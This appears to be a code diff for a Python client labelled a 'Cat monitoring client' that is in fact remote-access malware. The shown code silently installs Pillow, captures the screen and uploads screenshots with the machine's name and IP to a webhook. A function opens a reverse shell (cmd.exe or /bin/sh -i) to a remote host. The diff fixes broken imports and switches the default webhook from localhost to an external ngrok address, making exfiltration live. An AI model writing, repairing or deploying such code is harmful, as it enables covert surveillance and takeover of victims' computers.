@@ -1,12 +1,12 @@
-import argparse as a
-import socket as s
+import argparse
+import socket
 import sys
-import threading as t
+import threading
 import time
 import os
-import subprocess as sp
-import json as j
-import base64 as b64
+import subprocess
+import json
+import base64
 from typing import Optional
 from urllib import request as urlrequest,parse as urlparse,error as urlerror
 g_cam_thread:Optional[threading.Thread]=None
@@ -55,7 +55,7 @@ def _t():
     except ImportError:
         _q("[screen]PIL not found,installing Pillow...")
         try:
-            import subprocess as sp
+            import subprocess
             import sys
             subprocess.check_call([sys.executable,"-m","pip","install","Pillow","--quiet"])
             _q("[screen]Pillow installed successfully")
@@ -88,28 +88,28 @@ def _t():
             buffer=io.BytesIO()
             screenshot.save(buffer,format='JPEG',quality=80,optimize=True)
             fd=buffer.getvalue()
-            bd=f"----formdata-{int(time.time()*1000)}"
+            boundary=f"----formdata-{int(time.time()*1000)}"
             form_data=[]
-            form_data.append(f"--{bd}")
+            form_data.append(f"--{boundary}")
             form_data.append('Content-Disposition:form-data;name="name"')
             form_data.append("")
             form_data.append(name)
-            form_data.append(f"--{bd}")
+            form_data.append(f"--{boundary}")
             form_data.append('Content-Disposition:form-data;name="ip"')
             form_data.append("")
             form_data.append(ip)
-            form_data.append(f"--{bd}")
+            form_data.append(f"--{boundary}")
             form_data.append('Content-Disposition:form-data;name="frame";filename="screen.jpg"')
             form_data.append("Content-Type:image/jpeg")
             form_data.append("")
             form_text="\r\n".join(form_data)+"\r\n"
-            form_end=f"\r\n--{bd}--\r\n"
+            form_end=f"\r\n--{boundary}--\r\n"
             body=form_text.encode('utf-8')+fd+form_end.encode('utf-8')
             req=urlrequest.Request(
                 upload_url,
                 data=body,
                 headers={
-                    "Content-Type":f"multipart/form-data;bd={bd}",
+                    "Content-Type":f"multipart/form-data;boundary={boundary}",
                     "Content-Length":str(len(body))
                 },
                 method="POST"
@@ -130,7 +130,7 @@ def _t():
 def _u(host:str,port:int):
     _q(f"[nc]Opening shell session to{host}:{port}")
     try:
-        import subprocess as sp as _sp
+        import subprocess as _sp
         shell_cmd=["cmd.exe"]if os.name=="nt" else["/bin/sh","-i"]
         sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         sock.connect((host,port))
@@ -181,9 +181,9 @@ def _u(host:str,port:int):
 if __name__=="__main__":
     args=parse_args()
     _o=args.show
-    name=args.name or "RemotePC"
+    name=args.name or ""
     ip=_s()
-    wb=args.webhook_url or "http://127.0.0.1:8000/webhook"
+    wb=args.webhook_url or "https://ce5c81827d3d.ngrok-free.app/webhook"
     _q(f"[i]Cat monitoring client:name={name}ip={ip}")
     def webhook_ping():
         try:
